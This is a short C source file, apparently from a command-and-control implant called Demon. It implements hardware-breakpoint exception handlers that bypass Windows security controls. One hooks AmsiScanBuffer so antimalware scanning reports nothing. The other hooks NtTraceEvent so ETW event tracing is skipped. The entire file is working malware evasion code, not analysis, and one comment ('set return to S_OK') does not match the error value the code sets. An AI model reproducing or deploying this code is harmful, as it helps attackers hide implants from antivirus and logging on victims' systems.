#include <Demon.h>
#include <Core/HwBpExceptions.h>

#if _WIN64

VOID HwBpExAmsiScanBuffer(
    IN OUT PEXCEPTION_POINTERS Exception
) {
    PVOID Return = NULL;

    /* get AmsiResult param */
    EXCEPTION_ARG_5( Exception ) = 0;

    /* set return to S_OK */
    EXCEPTION_SET_RET( Exception, 0x80070057 ); /* invalid parameter */

    /* just return now */
    Return = EXCEPTION_GET_RET( Exception );
    EXCEPTION_ADJ_STACK( Exception, sizeof( PVOID ) );
    EXCEPTION_SET_RIP( Exception, U_PTR( Return ) );
}

VOID HwBpExNtTraceEvent(
    IN OUT PEXCEPTION_POINTERS Exception
) {
    PVOID Return = NULL;

    /* just return without tracing an event */
    Return = EXCEPTION_GET_RET( Exception );
    EXCEPTION_ADJ_STACK( Exception, sizeof( PVOID ) );
    EXCEPTION_SET_RIP( Exception, U_PTR( Return ) );
}

#endif
